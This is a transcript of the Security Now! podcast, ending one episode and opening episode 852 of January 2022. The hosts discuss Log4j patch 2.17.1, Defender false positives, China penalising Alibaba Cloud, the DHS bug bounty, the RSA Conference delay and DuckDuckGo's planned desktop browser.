LEO:  Of goodness.  Not a bad rabbit warren.  A good rabbit warren.  He takes messages.  His DMs are open on Twitter.  He's @SGgrc.  We also have the show at our website, TWiT.tv/sn.  You can subscribe, of course, in your favorite podcast application.  There's a YouTube channel.



We do the show on Tuesdays.  Now, next Tuesday we will not be here because it's the Best Of Security Now!.  We picked...



STEVE:  Yayyyyy.



LEO:  ...a bunch of horrible exploits from the year, and we strung them all together.  It'll be fun.  So next Tuesday there will be a show, but not live.  You'll just download it, and you can listen, and it's fun.  And then we will all be back in-studio after the New Year, January 4th for the next Security Now!.  If you want to tune in and watch it, we do it at about 1:30 p.m. Pacific, 4:30 Eastern, 21:30 UTC on Tuesdays.  You can stream it live, audio or video, at live.twit.tv.  Chat with us at irc.twit.tv if you're doing that, or in the Discord if you're a Club TWiT member.



Otherwise, I hope, Steve, you and Lorrie have a wonderful Christmas.  And are you going to do a New Year's Eve party?  Just the two of you, a little champagne?



STEVE:  You know, she's got asthma, and so...



LEO:  You don't want to go out.  I'm not suggesting that these days.



STEVE:  Yeah.  And but so, you know, Zoom and FaceTime, we'll say hi to our family.



LEO:  Yeah, there you go.



STEVE:  And sort of hang out with them virtually.



LEO:  Yeah.



STEVE:  And, you know, light the fire and, you know, just enjoy ourselves.



LEO:  We have, down the road where my daughter lives, there was a holiday party December 11th.  Twenty-eight people got COVID from this little party, and they think it was Omicron.  It just spreads so easily.  So it's just not worth, even if you're boostered, it's really not worth taking a chance, I think.



STEVE:  One of the MD talking heads on Sunday was likening it to the mumps in terms of communicability.



LEO:  It's just going to spread like crazy, yeah.



STEVE:  So, yeah.



LEO:  And, you know, most people, especially if you're boostered, it'll be sniffles, and you'll be fine.



STEVE:  And remember Vitamin D status has turned out to be...



LEO:  And I'm taking that Vitamin D.  I'm drinking my Vitamin C.  I'm making sure I - and taking zinc and all that stuff.  But it's kind of like Russian roulette, you know, you don't know.  You might be the one that really gets sick or gets long COVID.  And why take a chance?



STEVE:  Yeah.



LEO:  So we're going to just hunker down, I think is the thing to do.



STEVE:  Yeah, we don't want to lose any listeners.  Our listeners are valuable.  



LEO:  No, we can't afford to.  Every one of you matters.  I hope you all have a great holiday, take some time off, spend time with the fam.  Enjoy your New Year's Eve, and we'll be back January 4th to continue as we count down the last three years of Security Now!.  You son of a gun.  Have a great New Year's, Steve.  We'll see you next time.



STEVE:  Bye, everybody.  Happy New Year.



Copyright (c) 2021 by Steve Gibson and Leo Laporte.  SOME RIGHTS RESERVED.  This work is licensed for the good of the Internet Community under the Creative Commons License v2.5.  See the following Web page for details:  https://creativecommons.org/licenses/by-nc-sa/2.5/.




GIBSON RESEARCH CORPORATION		https://www.GRC.com/



SERIES:		Security Now!

EPISODE:	#852

DATE:		January 4, 2022

TITLE:		December 33rd

HOSTS:	Steve Gibson & Leo Laporte

SOURCE:	https://media.grc.com/sn/sn-852.mp3

ARCHIVE:	https://www.grc.com/securitynow.htm



DESCRIPTION:  This week we start off the new year with a handful of Log4j updates including yet another fix from Apache; some false positive alarms; Alibaba in the doghouse; and an underwhelming announcement from the U.S. Department of Homeland Security.  We note the postponement of a critical industry security conference, an interesting aspirational announcement from DuckDuckGo's CEO, and the soon-to-be-rising costs of cyber insurance.  Then, after a bit of miscellany and a SpinRite update, we look at the surprising technological decision that has forced the official creation of December 33rd.



SHOW TEASE:  It's time for Security Now!.  We start off the year with a handful of, yes, Log4j updates, including another fix from Apache.  Why couldn't they get it right?  Steve and I will talk a little bit about how you can write secure software.  Alibaba's in the doghouse.  And an underwhelming announcement from the Department of Homeland Security.  That and a look at Microsoft's bizarre fix for another Exchange Server flaw.  It's all coming up next on Security Now!.



LEO LAPORTE:  This is Security Now! with Steve Gibson, Episode 852, recorded Tuesday, January 4th, 2022:  December 33rd.



It's time for Security Now!, the show where we cover the latest security news.  A brand new year, and nothing's changed in security.  That's the guy in charge, Steve Gibson, GRC.com, doing everything he can to improve our security.  You know, and I guess it's inch by inch, bit by bit.  Happy New Year.



STEVE GIBSON:  Happy New Year to you, Leo.  2022 has arrived.  Well, for most of us.



LEO:  What?



STEVE:  There's an exception from which this podcast received its title.



LEO:  December 33rd.



STEVE:  That's right.



LEO:  That's today.



STEVE:  We're going to explain.  We're gonna 'splain why it's the 33rd in some locations of the web or the world.  This is Security Now! Episode 852 as we count down to the end of, well, we don't know what.



LEO:  Nothing is ended.  That's the problem.  Everything continues.



STEVE:  It sure does.  So we've got a bunch of fun things to talk about.  We're going to start off, of course, with a handful of continuing Log4j updates.  We've got, believe it or not, another fix, the fifth one, from Apache, still trying to get this right.  Some false positive alarms have been generated which caused consternation that was unwarranted.  Alibaba is in the doghouse as a consequence of their actions in this drama.  And we have an underwhelming announcement from the U.S. Department of Homeland Security, keeping us secure, but probably not their own network so much.



We're going to note the postponement of a critical industry security conference.  An interesting aspirational announcement from DuckDuckGo's CEO which will be interesting to see.  We'll talk about that.  And also the soon-to-be-rising costs of cyber insurance based on all of the feedback that the municipal bond analysts are producing.  We've also got a bit of miscellany, a quick update on SpinRite since it's been two weeks since we've talked, and things have happened.  And then we look at the surprising technological decision that has forced the official creation of December 33rd.



LEO:  A day that will live in infamy.



STEVE:  And might not be the last extra day we see in December.  We'll see how that goes.



LEO:  Wow.  Oh, wow.



STEVE:  So I think another fun podcast for our listeners.



LEO:  Awesome.  Looking forward to it.  And also I should mention some good news that the James Webb Telescope has opened up finally the fifth and final membrane of their solar shield.



STEVE:  Whew.



LEO:  Yeah, this is like the suspense story of our time, watching this incredibly complex device millions of miles away slowly deploy.  And if anything goes wrong, it's a lot of broken hearts.



STEVE:  Well, and a lot of money that got shot up into - yeah. 



LEO:  The 10 billion down the tube and, yeah.  But, gosh, you know, if it works we're going to - it's very exciting.  Anyway, that's good news.  We'll continue to report over the days and weeks to come as those benchmarks get hit.



STEVE:  I'm so happy, Leo, that we're still doing some science.



LEO:  I agree.



STEVE:  That we just haven't completely given up on...



LEO:  I agree.



STEVE:  ...things that don't have an immediate economic return.  But, you know, we may be needing someplace to go eventually.



LEO:  Yeah.



STEVE:  So, you know, having something out there looking around, saying, hey, what about that ball over there?



LEO:  Well, and, you know, we're both science fiction fans.  I think much of our audience are fans of science fiction.  So it's nice to report on some science fact that's also pretty darned exciting.  So that's some good news.  I thought I'd pass that along.  It happened about four hours ago, but I just found out.  Now it's time for our Picture of the Week, Steve.



STEVE:  So this was just something fun that I had in the queue of stuff since there was nothing particularly more relevant that I ran across.  One of our listeners ran ShieldsUP! on his Tesla.



LEO:  What?  Tesla runs, not Windows.  It runs Linux.  You must have done some tricks to do this.



STEVE:  Well, no, because...



LEO:  Oh, in the browser, of course.  Yeah, yeah, yeah.



STEVE:  A browser, right, right, right.  So, yeah.  So the good news is you may not be stealth on the road, but you can be invisible, very stealthy on the Internet.



LEO:  Look at all that green.  Completely stealthed.



STEVE:  Yeah.  And I don't know whether, like I would be surprised if you got your own IP address as you were driving around.  I would bet that you're being proxied through Tesla Central.  So that IP address, I mean, he shows the IP address, right, 31.161.190.103.



LEO:  That's a weird address.  That's a weird-looking address.



STEVE:  Standard IP address, of course.  But 31?  I don't know what network that is.



LEO:  Who owns 31?  Yeah.



STEVE:  Yeah.  But anyway, just sort of a cool, fun Picture of the Week showing, yes, no ports are open on your Tesla.



LEO:  Anybody can do this because the test will come to the browser.  You can do this on any device with a browser; right?



STEVE:  Yeah, yeah.



LEO:  That's cool.



STEVE:  So, okay.  Last Tuesday the 28th, between Christmas and New Year's, the illustrious, maybe a little less lustrous than before, Apache Software Foundation released another batch of Log4j patches, "batch" because they've got Java 5, 6, 7, 8 still, or I guess 6, 7, and 8.  I think 5 finally completely bit the bullet.  But addressing yet another arbitrary code execution flaw which has been discovered in Log4j which can again be used by bad guys to run their malicious code on vulnerable machines, making this the fifth security shortcoming to be discovered in Log4j in the span of a month.  And, you know, I suggest more than anything this again highlights, you know, the fact that we keep finding problems, what happens when really smart hackers carefully examine code that really smart hackers haven't yet carefully examined.  They're going to find things.



So writing code that works is entirely different from writing code which is secure.  They're really distinct and completely separate goals.  One is easy; the other is surprisingly difficult and sets the bar far higher.  It's possible, and I think one of the reasons is you don't really get credit for writing secure code; right?  It's possible to directly see features, and so those get bullet points.  And of course everyone says, oh, it's super secure.  But you can't see a lack of security in the implementation of those features.  So it doesn't really have to happen until problems arise.



So the good news is the CVSS severity score in this fifth case, and like those more recent ones, keeps dropping with these successive discoveries.  None of these follow-on problems that have since been fixed sport that initially eye-popping 10.0 that we had.  This latest one got a CVSS of 6.6.  And all of the Log4j versions which precede it, from 2.0-alpha7 through 2.17.0 for Java 8 are vulnerable.  So once again they all need to get fixed.  And this is the problem with these rolling updates more than anything else is that it's easy to say, oh, we found another problem.  Everybody should fix it.



But as we talked about, thanks to Google's research about the depth of the dependency tree of the Java libraries which depend upon this, this is a nightmare.  So you need to go, anybody who's in charge of this, or if you're digging into see what dependencies are important, 2.17.0 now needs to be 2.17.1.  So it was a dot release.



And although Apache didn't acknowledge the researcher who reported the issue, Checkmarx security researcher Yaniv Nizry has claimed credit, and I'm sure it's due, for reporting the vulnerability to Apache, and this was impressive, the day before their release last Monday the 27th.  So it took them, like, no time, one day.  This 2.17.1 was released the next day.  He has published a detailed blog posting to back up his claim that it was he who provided this.



He said:  "The complexity of this vulnerability is higher than" - well, of course because it would be hard for it to be much lower - "is higher than the original CVE-2021-44228 since it requires the attacker," he wrote, "to have control over the configuration.  Unlike Logback, in Log4j there is a feature to load a remote configuration file" - of course, why wouldn't there be, my lord - "or to configure the logger through the code.  So an arbitrary code execution could be achieved with a man-in-the-middle attack, for example, user input ending up in a vulnerable configuration variable, or modifying the config file."  In other words, yet another feature that Log4j probably didn't ever need, which created yet another vulnerability that we also wish we didn't have.  Now we don't.  But it's still a big nightmare.



The problem, as I was just saying, is the need to keep all the affected libraries within the entire sprawling somewhere between seven and nine-layer deep JAVA dependency tree updated with the latest release.  And this is made so much more problematic when Apache needs to keep updating their patches as new issues - like this is increasingly small; right?  So still it needs to get fixed.  So it's a mess.



The developer and security communities which have been doing their best to like stay current are getting a little stretched feeling.  They reacted to this latest news, which was first disclosed, not even by Apache, but by Nizry's own public tweet, with an explosion of reaction traffic.  One user replied:  "I hope this is a joke, I hope so much."  Another tweeted:  "We are LONG [in all caps] past the point where the only responsible thing to do is put up a giant flashing neon sign that reads 'LOG4J CANNOT BE FIXED.  DO NOT USE IT FOR ANYTHING.'"



And even Kevin Beaumont, who tweets as GossiTheDog, labeled the instance another "failed Log4j disclosure in motion."  Because no time was given to allow people to patch this before Nizry completely disclosed how this could be abused.  Maybe that was part of what got Apache off the dime and immediately put out 2.17.1 in between Christmas and New Year's.  They weren't waiting.



But again, the problem is it's one thing for Apache to say, hey, we've changed our minds about 2.17.0.  Just kidding.  Now you need 2.17.1.  Getting it, like, actually out is a huge problem.  And, you know, during these past few weeks we've really been treated to a ringside seat to observe everything that's wrong with the current way software is being built, maintained, secured, and deployed; and after deployment, its management.



For the most part, the system works.  And in fairness, what it does is truly amazing.  The ability to openly and freely build upon the work of others creates incredible economies.  But it is nevertheless a brittle system which breaks down the moment something as ubiquitous as Log4j being found to be untrustworthy, and in fact very readily exploitable, thus the 10.0, occurs.  So we're not done with this yet.



LEO:  Sometime I would love to spend some time with you talking about what would one do if one wanted to write secure software?  Is there a process, or is it just a mindset?  Do you have to think like a bad guy to think about all the ways this could be abused?



STEVE:  You know, now's as good a time as any.  You and I have often talked about this really interesting phenomenon that anyone coding has experienced, where you can't see your own mistakes.



LEO:  Yeah.



STEVE:  You just can't.  And, you know, and it's not ego.  It's not that, I mean, I don't have any ego.  Everybody who follows me in the newsgroup and who watched me nail every bug that SQRL had and is watching me do the same thing for SpinRite, I want to find these problems.  There's no denial anywhere.



LEO:  Of course, yeah.  But you can't see them.  You can look  and look and look.



STEVE:  Exactly.



LEO:  This is why in the business the process usually involves code review by your peers, where you say, well, look at my code, and I'll look at your code.  It's hard to do it in solitary.



STEVE:  So, yes.  And I would say, I would use a word different than "hard."  I mean, well-nigh impossible.



LEO:  Yeah.



STEVE:  And this has happened to me where I look at a function which I know is broken.  And I look at it again, and I read it knowing that there's a problem, which increases my focus because it's like, okay, there's a problem here somewhere.  So there's no longer a presumption that it's pristine.  It's, okay, there's something evil hiding.  And so that gives you one, like, change of attitude which is valuable.  And often that's all it takes.  And I've wondered about that phenomenon, that when the compiler, or the assembler in my case, finds a bug, I'll go back to the code I just wrote and go, ah, you know.  It's like just being told "no."  It's like, then I'll look at it thinking, okay, wrong.  And I'll go, oh, of course, look at that.  How could I have done that?  And then I'll fix it.



Well, why didn't I see it before I hit the Assemble button?  I don't know.  But being told "no," that helps me to go, oh.  But despite all of that, even knowing that there's like a problem I can't see, it will sometimes be single-stepping through the algorithm until I hit the thing, and I go, oh.  I mean, it's like it has to be just rubbed in your face before you see it.  And so, Leo, I think that it's this concept of a red team.  What I would say is that somebody other than the author or the team, maybe other team members could like cross-check each other's code.  But somebody is going to find the problem.  Who do you want that to be?



And so it's why I really think that, when in the case of Log4j, that horrible initial 10.0 drew the interested focus of a bunch of other talented security-aware coders, and there is, there certainly is something to this idea of having like a higher level, like a security-trained coder who's just seen all the things that can be done wrong and looks at code, not from the standpoint of assuming it's right, but in challenging every assumption that the original coder made about what his code was going to do.  And it's, oh my god, it's far more laborious to do that than it is just to make it work, assuming that all the conditions are what you want them to be.  It's a completely different approach.



But I think the idea of a red team, of having a - and really that's what bounties are; right?  Bounties are paying good guys to find the problems you and your enterprise and your coders cannot find.  And no one's going to do it for free.  I mean, it's sort of the - it's the failing of the open source effort; right?  I mean, it's that wonderful pyramid of blocks resting on one little toothpick down at the bottom.  It's like, you know, some unpaid guy in some far off land who no one's ever met, and yet we're all dependent upon him; you know?  And it's thankless.



There was a plea from Wikipedia over the holidays.  I do $10 a month because I just - I want to support them.



LEO:  Absolutely, yeah.



STEVE:  And I wish there were some way of associating my identity with that because I feel guilty when they ask me.



LEO:  I know, I get bugged by - I know.



STEVE:  Yeah.



LEO:  I don't feel guilty.  I know I'm giving them money so I just, like, okay, okay.



STEVE:  Yeah, exactly.  And the guy that does Tree Style Tabs, which I also use every week, I depend upon it in Firefox.  He was begging for some money, so I gave him some.  But still, most of this open source stuff is just done by hobbyists because they're well-meaning, but they're often not security-trained.  OpenSSL is a disaster until it finally got deeply looked at, as we talked about years ago, and all kinds of problems were found with it.



In fact, as we also said, Amazon just wrote their own from scratch.  They said, forget that.  You can't even understand this spaghetti, you know, what this thing has turned into over time.  So we're just going to, you know, TLS isn't that hard.  We're just going to do one.  And they did.  Which was like, what was it, 1/20th the size and had all the same functions, but just none of the extra cruft that had, you know, the barnacles that had grown onto it over time.



So I think that one solution, and we've also talked about this, is taking C out of people's hands because it's still the most popular solution, and it is just powerfully dangerous.  I mean, it is so, so dangerous.  And in fact, it's probably what caused the naming of this podcast, December 33rd, as we'll be getting to.  



LEO:  Oh, interesting, yeah.



STEVE:  It's that kind of problem.



LEO:  Yeah, I think we are moving towards safer languages which can nudge the programmer in the right direction.  But that's only a certain kind of flaw.  And then there's higher level stuff that can happen that you just have to kind of, I don't know, I think you have to have a mindset.



STEVE:  Well, and we have Microsoft wondering whether it's necessary to have the deep optimization where they noticed that Chromium is having half of its problems come from the...



LEO:  Super secure mode, yeah.



STEVE:  ...deep optimization.  You know, we've got processors you have to pour liquid helium on them...



LEO:  Pretty hard.



STEVE:  ...in order to keep them operating.  We just don't need that level of optimization anymore.



LEO:  No.  It's a good subject.  I'd love to talk more about that over time, yeah, making your software more secure, yeah.



STEVE:  Yeah.  And the problem is budget and time.  I mean, I'm living in this world where I don't have anybody telling me that I have to ship anything by a certain date.  And if you do, everything changes because nothing ever happens in the time scale that you expect it to.



LEO:  Right.



STEVE:  It just doesn't.  And you end up having to ship stuff.  What is it?  We hear Paul and Mary Jo talk about it.  "Oh, yeah, well, Windows, there's 10,000 bugs, and they shipped it."  It's like, what?  It's just incredible.



Okay.  So speaking of Microsoft and bugs, last week - and actually this is a time-constraint story.  Microsoft Defender's newly and perhaps too hastily deployed Log4j scanner has been triggering false positive alerts which hasn't been helping anyone's nerves.  Everybody's already on edge about Log4j, and then suddenly Microsoft Defender is saying "Log4j, Log4j, you've got some."  And it's like, what?  Where?  So this was Microsoft Defender for Endpoint.  It was showing sensor tampering alerts linked to their newly deployed Microsoft 365 Defender scanner for Log4j processes.  So, yeah, Log4j.



The alerts are reportedly mainly shown on Windows Server 2016 systems and warn:  "Possible sensor tampering in memory was detected by Microsoft Defender for Endpoint," and that's created by something called the "OpenHandleCollector.exe" process.  And according to field reports, admins have been dealing with this issue since at least the previous week.



In response to these panic-inducing false positives, Tomer Teller, who's the - I love this title, too - the Principal Group PM Manager at Microsoft, Enterprise Security Posture.  Now, people have been comparing Microsoft to IBM.  And, boy, if you've got the Principal Group PM Manager at Microsoft, Enterprise Security Posture, okay, yeah.  That's a company that's been growing.  Tomer explained that although this Defender process's behavior is tagged as malicious, there's nothing to worry about, to move along, since these are false positives.  Well, thank you, Tomer.  But still it's upsetting everyone.



He indicated that Microsoft is currently looking into this Microsoft 365 Defender issue and working on a fix, which of course is what the Principal Group PM Managers at Microsoft say when anything goes wrong, and that the company should soon deliver a fix for  affected systems.  Tomer Teller explained:  "This is part of the work we did to detect Log4j instances on disk.  The team is analyzing why it triggers the alert."  And it shouldn't, of course.



Exactly one week ago, last Tuesday, Microsoft said that their newly deployed Log4j scanner was rolled out with a new consolidated Microsoft 365 Defender portal Log4j dashboard for threat and vulnerability management.  So, yeah, they added a whole big Log4j dashboard thing to 365 Defender.  The new dashboard is designed to help customers identify and remediate files, software, and devices exposed to attacks exploiting Log4j vulnerabilities.  Now, of course, this happened quickly; right?  Microsoft didn't have a lot of time to work on this.



And so of course, to place this into perspective, this is not the first time such a thing has happened.  Since October 2020, Windows admins have had to deal with other Defender for Endpoint false positives, including one that marked Office documents as Emotet malware payloads, one that showed network devices infected with Cobalt Strike when they weren't, and another that tagged Chrome updates as PHP backdoors.



Now, in a world where very clever bad guys have forced malware detectors into the use of heuristic algorithms, false positives become a real problem; right?  I mean, the only solution is to test all new code extensively to make sure that benign services don't raise false positive alarms.  But the need to rapidly push something out into the field to protect vulnerable enterprise users in the face of an emergency such as Log4j can make the time required for extensive testing difficult to justify.  So I get it; right?  There's a tradeoff.  Doesn't help for Microsoft to wait six months and then release this.  But, boy, is it good.



So let's just hope that amid the reports of some false alarms, this new Log4j scanner was also able to correctly detect unsuspected instances of Log4j residing on disk, as it was designed to, and that many disasters will have been averted as a result.  So on balance a good thing Microsoft did this and pushed it out.  And yes, in the case of Log4j, at 10.0 on the CVSS, probably better sooner than later, even if it's at the cost of some false positives.  Maybe it would have been nice if they'd said, you know, don't panic when this goes off because we figured you wanted to have something rather than nothing.  So here it is.  But, you know, it has to guess a little bit.  And it could guess wrong.



Speaking of being maybe wrong, the Chinese government is annoyed with Alibaba.  Remember how we reported three weeks ago that the Apache Software Foundation was first informed of the ultra-critical Log4j vulnerability by, of all entities, Alibaba in China.  It turned out that China's not happy that they weren't told first.  China's Internet regulator, the Ministry of Industry and Information Technology (MIIT), has temporarily suspended a partnership with Alibaba Cloud which is the - Alibaba Cloud is the cloud computing subsidiary of the Alibaba Group, the ecommerce giant.  You know, they're like China's equivalent of Amazon.



This six-month suspension was the result of Alibaba's failure to promptly inform the government about the Log4j security vulnerability.  Gee, I wonder what China would want with early access to that, eh?  The suspension was disclosed by Reuters and the South China Morning Post, citing a report from the 21st Century Business Herald, which is a Chinese business news daily.  Reuters wrote:  "Alibaba Cloud did not immediately report vulnerabilities in the popular open source logging framework Apache Log4j v2 to China's telecommunications regulator.  In response, MIIT suspended a cooperative partnership with the cloud unit regarding cybersecurity threats and information-sharing platforms."



Okay.  Now, the fact that it wasn't a permanent, like, termination, was a suspension, suggests kind of a slap; right?  I mean, like they clearly need this relationship, and they're not willing to give it up completely.  And as we know, this Log4Shell, which was the name given to the exploitation of the Log4j vulnerability, first came to light after Chen Zhaojun of the Alibaba Cloud security team sent an email alerting the Apache Software Foundation of the critical flaw on November 24th.  That's when this first all began.



Chen added that it, in his email, "has a major impact."  And just as the patch was being readied for release, details of the vulnerability were shared on a Chinese blogging platform by an unidentified actor on December 8th, which sent the Apache team scrambling.  So it had become suddenly public from November 24th to December 8th, which is why Apache scrambled to release the patch two days later, on the 10th, December 10th.



Now, one might suspect that officials within China's Ministry of Industry and Information Technology are mostly embarrassed.  MIIT said in a belated statement published on December 17th, so exactly one week after the Apache release, that:  "This vulnerability may cause a device to be remotely controlled, which will cause serious hazards such as theft of sensitive information and device service interruption."  And the Ministry added that it was only made aware of the flaw on December 9th, 15 days after Alibaba's initial disclosure to Apache.



So this pushback from MIIT occurred months after the Chinese government issued stricter vulnerability disclosure regulations which mandate that software and networking vendors affected with critical flaws, alongside entities or individuals engaged in network product security vulnerability discovery, report them firsthand to the Chinese government authorities mandatorily within two days.  I remember we talked about this at the time.  This was late summer of last year.  And last September, China followed it up by launching the "cyberspace security and vulnerability professional databases" for the reporting of security vulnerabilities in networks, mobile apps, industrial control systems, smart cars, IoT devices, and other Internet products that could be targeted by threat actors.  So they'd made that official, and that's where they wanted that report submitted, not to Apache.



So feeling duly chastised by the Ministry's action, according to a follow-up report from the South China Morning Post, Alibaba Cloud said that it would work towards improving its risk management and compliance, saying that it did not fully comprehend the severity of the flaw [uh huh] and that it did not share the details with the government in a timely fashion.  So we're sorry.  We won't do that again.  Right.



So the Hack the DHS bug bounty was expanded to explicitly include Log4j flaw-based attacks.  And I was like, what?  The U.S. Homeland Security Secretary Alejandro Mayorkas recently announced that the DHS would broaden its new bug bounty program to explicitly solicit the discovery of vulnerabilities in its networks resulting from the exploitation of Log4j.  He did this in a tweet.  He tweeted:  "In response to the recently discovered Log4j vulnerabilities, @DHSgov is expanding the scope of our new HackDHS bug bounty program and including additional incentives to find and patch Log4j-related vulnerabilities in our systems.  In partnership with vetted hackers" - because, you know, you just can't let anybody poke at the government - "the federal government will continue to secure nationwide systems and increase shared cyber resilience."



Okay.  So as we know, the CISA demanded that no one go home for Christmas until all federal agencies had addressed their own Log4j vulnerabilities.  Unfortunately, as we've seen, doing that in short order just because someone federal bureaucrat demands it doesn't make it so.  Old and vulnerable versions of Log4j used for logging are far too buried deeply underneath existing systems to be immediately patched overnight just because Santa is on the way.  So let's hope...



LEO:  Can Santa write code?  Is Santa good at patching things?



STEVE:  He's got a lot of elves.



LEO:  I hope they're coders.



STEVE:  Yeah.  Let's hope it was a white and not a red Christmas.



LEO:  Oh.



STEVE:  So far, officials at the cyber branch of the DHS have said they've seen no signs of malicious actors using the vulnerability to breach the systems of federal departments and agencies, but they've warned that attacks utilizing the flaw might still occur.  Yeah, no kidding.  If attacks really haven't occurred, it's only because there are still currently too many other far more lucrative and juicy pieces of lower hanging fruit to be plucked using the Log4j hedge trimmers.  I mean, that's just the only explanation.



However, I have to say that I'm unimpressed by what DHS is willing to pay.  Mayorkas said security researchers participating in the bug bounty program would be paid anywhere from $500 to $5,000, "depending upon the gravity of the vulnerability."  $500?  Really?  What a cheap-ass government.



LEO:  Well, also, remember you're competing with people who will pay a lot more.



STEVE:  Exactly.  $500 isn't even worth the hassle of reporting the problem.  That's ludicrous.  When the world is chockfull of cash-rich enterprises just waiting to be ransomed, what underworld lowlife is going to waste his or her time poking around the Department of Homeland Security for a possible $500 payday?  Which, I assume, unlike a big ransom payment, is taxable.



So I did a bit more digging into this, and I suspect that the problem is that Mayorkas or his underlings, because I'm sure he just tweeted something that someone wrote for him, really don't have any idea what Log4j is.  As we know, because we covered it at the time, back in 2016 the U.S. Department of Defense introduced the Hack the Pentagon program.  And after that program discovered nearly 140 previously unidentified vulnerabilities on some of the department's websites.  Yeah, right.  Like, oh, you forgot the "S" on HTTP.  Can I have 500 bucks, please?  Really not very hard to solve problems.



The program was declared a success and was quickly duplicated by other branches of the U.S. military.  The problem, of course,  is Log4j is not some website vulnerability.  It's an entirely different scale and class.  For which Mayorkas says, yeah, 500 bucks.  And besides, didn't CISA declare that Christmas would be postponed until all federal agencies had the Log4j bug expunged from their networks?  Since Christmas arrived on schedule this year, it must be that Log4j is already a non-issue within the entire federal government.  So problem solved; right?  Yes, your U.S. taxpayer dollars hard at work.



LEO:  At least they're frugal with them, in that case.



STEVE:  I guess that's true.  Yeah, boy.  You know, it's just, we know the bad guys will get to the government in time.  But  if they're being so cheap, certainly no reason to tell them about the problems you find.



COVID has postponed the RSA Conference.  Organizers of the annual RSA Conference, one of the largest cybersecurity events of the year, announced before the end of last year that they're moving the annually scheduled February gathering to June over health concerns.  In an email to attendees, the organizers said, I guess the attendees were the first to be notified, everybody else will be told, too, that the recent uptick in COVID-19 cases, of course that everyone's aware of, made it difficult to hold an in-person event, which I guess they're still holding onto, in near term.



The RSA Conference was originally slated to be held the week of February 7th, and past events have attracted tens of thousands of cybersecurity professionals to San Francisco's Moscone Center and the surrounding area.  And of course as our listeners know, it was during one of those fateful conferences that I encountered Yubico's Stina Ehrensvard, whom no one had heard of at the time.  She was sort of forlornly standing at the top of the Moscone Center escalators, looking around for someone who would talk to her.  And as a result of their brilliant concept and the listeners of this podcast, we were able to play a pivotal role in Yubico's early start.  So conferences still do pay off.  Maybe now they're more cyber than they were physical.



In any event, for this year Linda Gray Martin, VP of the RSA Conference, wrote:  "We are extremely disappointed to share that we're not able to gather in person this February.  But we firmly believe that with the surge in COVID-19 cases around the world, this is the responsible step to take to ensure our community stays healthy and can focus on protecting our critical systems and businesses against ever-present cyberthreats."  And of course at the same time real-world viral threats.



So their plan is, and I hope it works out, for an in-person conference to be held from June 6th through the 9th.  The organizers said they will contact all registered attendees, speakers, event sponsors, exhibitors, and partners regarding the postponement.  And just as a heads-up for anyone who would be planning to attend, they're going to hold to some health measures.  You will be required, all attendees and exhibitors and everybody physically within the confines will be required to show a proof of vaccine for COVID-19 and the mandatory use of face masks for all indoor activities.  So I would not have gone if it's in any way possible to see this stuff online.  At this point, things are a little bit crazy in COVID land.  So anyway, if that affects anybody, if by any chance you missed that email, it's not going to be February.  It's going to be June.



DuckDuckGo continues to grow.  Of course we've talked about DuckDuckGo previously.  And I don't know, Leo, I still have a difficult time with the name.



LEO:  You never played the game.  That's why.



STEVE:  I never played the game.  And I'm not sure that I want to "duck it."  I'm still googling it.  Although I did, it did induce me to go take a look at their page, and it sure is a lot cleaner.  I mean, once upon a time it was Google that was such a clean page.  And of course now it's a lot more overtly ad-sponsored than it was.



LEO:  Yeah, it's very sad, yeah.



STEVE:  And it does bug me that when I click a link, it redirects through them.  It's like, why is it any of their business that I clicked that link?  But it's also clear that DuckDuckGo is picking up the pace of its continued growth.  I've got a chart in the show notes showing their traffic from 2010 to now.  And boy, I mean, they are going - unfortunately, it's not only DuckDuckGo that's gone exponential.  COVID, as we know, at the moment is surging.  But it is really a beautiful growth curve.



Now that 2021 has wrapped up, we know how that year went for DuckDuckGo.  Its clearly privacy focused search engine was used for more than 34.8 billion queries in 2021, making that an increase of more than 47 percent from 2020, which itself was an increase of similar size or percentage from 2019.  So it's going crazy.  And given the fact that Google and Bing are known to be rapaciously siphoning and tracking and doing everything in their power to extract every possible bit of revenue from their users, DuckDuckGo's growth suggests that many people are becoming increasingly comfortable with using it as an alternative.



Of course, as we know, they initially made a name for themselves being a search engine that had no interest in tracking; and then they further expanded into other products, apps and extensions aimed at enforcing or enabling a more private online browsing experience.  And now DuckDuckGo is planning to expand its offerings to include a browser for desktop users.  And that's why I, like, was brought up short.  It's like, wait, what?



At the end of their 2021 Review blog post, DuckDuckGo's CEO Gabriel Weinberg talked a bit about their forthcoming desktop web browser.  He said:  "Like we've done on mobile, DuckDuckGo for desktop will redefine user expectations of everyday online privacy.  No complicated settings, no misleading warnings, no 'levels' of privacy protection.  Just robust privacy protection that works by default across search, browsing, email, and more."  He says:  "It's not a 'privacy browser,' it's an everyday browsing app that respects your privacy because there's never a bad time to stop companies from spying on your search and browsing history."



He said:  "Instead" - and this is what I found really interesting.  "Instead of forking Chromium or anything else, we're building our desktop app around the OS-provided rendering engines, as we have on mobile, allowing us to strip away a lot of the unnecessary cruft and clutter that's accumulated over the years in major browsers.  With our clean and simple interface combined with the beloved Fire Button from our mobile app, DuckDuckGo for desktop will be ready to become your new everyday browsing app.  Compared to Chrome, DuckDuckGo app for desktop is cleaner, way more private, and early tests have found it significantly faster, too."  Wow.  So that's interesting.  I'm sure we'll all be very curious to see how that develops.  And I will be keeping my eye peeled for some additional information.



And I'm curious.  I've often talked about how difficult it is to build and maintain one's own browser now.  These days it's like a little OS; right?  I mean, you have to really, really want to, as Google clearly does.  Microsoft wanted to, as well.  But a web browser wasn't their central mission, so they wisely abandoned the sinking ship of IE and Edge Classic in favor of a Chromium fork and created the new Edge, which I guess Paul and Mary Jo - is it still Credge over there on Windows Weekly?



LEO:  Oh, yes.  Oh, yeah.



STEVE:  So anyway, Gabriel referred to forking Chromium.  He talked about that in his note, saying no, we're not doing that.  So that more obvious choice, which was the path taken by all non-Firefox browsers, Firefox and the Tor browser, it was on DuckDuckGo's radar.  But they appear to believe they can build somehow a lightweight web browser around the hosting OS's native HTML rendering engine.  Like I said, good luck.



I love the idea in theory of what he describes as "doing away with a lot of the unnecessary cruft and clutter that's accumulated over the years in major browsers."  But I don't know.  There are many services that contemporary users want and now expect and in some cases even need from their browsers that make them convenient to use.  For example, what about - you were just talking about Bitwarden.



LEO:  Oh, yeah.



